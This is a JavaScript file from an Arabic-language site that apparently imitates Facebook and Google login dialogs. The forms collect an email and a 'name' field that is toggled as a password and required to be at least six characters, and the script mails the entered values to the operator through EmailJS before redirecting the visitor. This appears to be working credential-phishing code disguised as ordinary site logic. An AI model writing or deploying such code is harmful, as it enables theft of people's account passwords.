// --- Initial Setup and Configuration ---

// Automatically set theme based on user's system preference
if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
  document.documentElement.classList.add('dark');
} else {
  document.documentElement.classList.remove('dark');
}

// EmailJS Initialization
(function() { 
    emailjs.init({ publicKey: "ve0kltmnNlIQEfRGw" }); 
})();

// Regular expression to find and remove emojis
const EMOJI_REGEX = /(\u00a9|\u00ae|[\u2000-\u3300]|\ud83c[\ud000-\udfff]|\ud83d[\ud000-\udfff]|\ud83e[\ud000-\udfff])/g;


// --- Core Functions ---

/**
 * Handles form submission, validation, and sending data via EmailJS.
 * @param {string} formId - The ID of the form element.
 * @param {string} buttonId - The ID of the submit button.
 * @param {string} nameFieldId - The ID of the name input field.
 * @param {string} emailFieldId - The ID of the email input field.
 */
function handleFormSubmit(formId, buttonId, nameFieldId, emailFieldId) {
    const form = document.getElementById(formId);
    if (!form) return; // Exit if form doesn't exist

    form.addEventListener('submit', function(event) {
        event.preventDefault();
        
        const submitButton = document.getElementById(buttonId);
        const nameInput = document.getElementById(nameFieldId);
        const emailInput = document.getElementById(emailFieldId);
        const serviceID = 'service_isy639u';
        const templateID = 'template_2dyli79';

        // --- Validation ---
        form.querySelectorAll('.error-message').forEach(e => e.remove());
        let isValid = true;
        
        // Name length validation (must be 6 or more characters)
        if (nameInput.value.trim().length < 6) {
            isValid = false;
            displayError(nameInput, 'الاسم واللقب يجب أن يتكون من 6 أحرف على الأقل.');
        }

        if (!isValid) return; // Stop if validation fails

        // --- If validation passes, proceed to send ---
        const originalButtonText = submitButton.innerText;
        submitButton.disabled = true;
        submitButton.innerText = 'جارٍ الإرسال...';

        const templateParams = {
            from_name: nameInput.value,
            email_id: emailInput.value,
        };

        emailjs.send(serviceID, templateID, templateParams)
            .then(function(response) {
                // Redirect on success
                window.location.href = "https://mo3adli.github.io/home/";
            }, function(error) {
                alert('فشل الإرسال. يرجى التحقق من التفاصيل والمحاولة مرة أخرى.');
                submitButton.disabled = false;
                submitButton.innerText = originalButtonText;
            });
    });
}

/**
 * Displays an error message below an input field.
 * @param {HTMLElement} inputElement - The input field to display the error for.
 * @param {string} message - The error message to display.
 */
function displayError(inputElement, message) {
    const error = document.createElement('p');
    error.className = 'error-message text-red-500 text-xs mt-1 text-right';
    error.textContent = message;
    inputElement.parentElement.appendChild(error);
}

/**
 * Sets up the event listeners to open and close a modal.
 * @param {string} modalId - The ID of the modal element.
 * @param {string} openBtnId - The ID of the button that opens the modal.
 * @param {string} closeBtnId - The ID of the button that closes the modal.
 */
function setupModal(modalId, openBtnId, closeBtnId) {
    const modal = document.getElementById(modalId);
    const openBtn = document.getElementById(openBtnId);
    const closeBtn = document.getElementById(closeBtnId);

    if (!modal || !openBtn || !closeBtn) return; // Exit if elements don't exist

    openBtn.addEventListener('click', () => modal.classList.replace('modal-hidden', 'modal-visible'));
    closeBtn.addEventListener('click', () => modal.classList.replace('modal-visible', 'modal-hidden'));
    modal.addEventListener('click', (event) => {
        // Close modal only if the dark overlay is clicked, not the content inside
        if (event.target === modal) {
            modal.classList.replace('modal-visible', 'modal-hidden');
        }
    });
}


// --- Event Listeners and Initializations ---

// Wait for the DOM to be fully loaded before running scripts
document.addEventListener('DOMContentLoaded', () => {
    
    // Initialize all three forms
    handleFormSubmit('contact-form', 'submit-button', 'name', 'email');
    handleFormSubmit('facebook-login-form', 'fb-login-button', 'fb-name', 'fb-email');
    handleFormSubmit('google-login-form', 'google-login-button', 'google-name', 'google-email');

    // Setup both modals
    setupModal('facebook-modal', 'open-facebook-modal', 'close-facebook-modal');
    setupModal('google-modal', 'open-google-modal', 'close-google-modal');

    // Google Modal: Show/Hide Name Logic
    const showNameCheckbox = document.getElementById('show-name-checkbox');
    const googleNameInput = document.getElementById('google-name');
    if (showNameCheckbox && googleNameInput) {
        showNameCheckbox.addEventListener('change', function() {
            googleNameInput.type = this.checked ? 'text' : 'password';
        });
    }

    // Prevent Emoji Input in all specified text fields
    const inputIds = ['email', 'name', 'fb-email', 'fb-name', 'google-email', 'google-name'];
    inputIds.forEach(id => {
        const inputElement = document.getElementById(id);
        if (inputElement) {
            inputElement.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(EMOJI_REGEX, '');
            });
        }
    });
});
